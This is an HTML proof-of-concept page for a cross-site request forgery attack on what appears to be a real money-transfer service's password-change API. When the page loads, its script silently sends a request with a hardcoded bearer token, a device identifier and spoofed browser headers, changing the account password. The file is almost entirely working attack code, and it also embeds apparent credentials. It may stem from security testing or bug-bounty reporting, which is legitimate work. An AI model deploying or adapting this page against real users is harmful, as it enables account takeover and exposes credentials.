<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CSRF PoC</title>
</head>
<body>
    <form id="csrfForm" action="https://api.remitly.io/v1/auth/change_password" method="POST">
        <input type="hidden" name="current_password" value="Bob@1234">
        <input type="hidden" name="new_password" value="Bob@1234567890">
        <input type="hidden" name="new_password_conf" value="Bob@1234567890">
    </form>

    <script>
        function setHeaders(xhr) {
            xhr.setRequestHeader("Content-Type", "application/json");
            xhr.setRequestHeader("Remitly-Deviceenvironmentid", "3RoCNPorqD9uZIc15KMLMZBiAlrmafVdGtltQg1HkwtkijVRpwmeZ69653aA95tiHgwif1WqYXIDgAJRWSAPmoOlBDvydGS6WjUVgnW92muj");
            xhr.setRequestHeader("X-Remitly-Perf-Reqsize", "800");
            xhr.setRequestHeader("X-Remitly-Perf-Starttime", "1717175043508");
            xhr.setRequestHeader("Accept-Language", "en, en;q=0.5");
            xhr.setRequestHeader("Authorization", "Bearer xbNEF73hYAVfHBG6XmXbMku7CgcmTCJhTeT7cVkSN4r");
            xhr.setRequestHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.141 Safari/537.36");
            xhr.setRequestHeader("Accept", "application/json");
            xhr.setRequestHeader("Origin", "https://www.remitly.com");
            xhr.setRequestHeader("Sec-Fetch-Site", "cross-site");
            xhr.setRequestHeader("Sec-Fetch-Mode", "cors");
            xhr.setRequestHeader("Sec-Fetch-Dest", "empty");
            xhr.setRequestHeader("Referer", "https://www.remitly.com/");
            xhr.setRequestHeader("Accept-Encoding", "gzip, deflate");
        }

        document.addEventListener("DOMContentLoaded", function() {
            var form = document.getElementById('csrfForm');
            var xhr = new XMLHttpRequest();
            xhr.open(form.method, form.action, true);
            setHeaders(xhr);
            xhr.send(JSON.stringify({
                "current_password": "Bob@1234",
                "new_password": "Bob@1234567890",
                "new_password_conf": "Bob@1234567890"
            }));
        });
    </script>
</body>
</html>
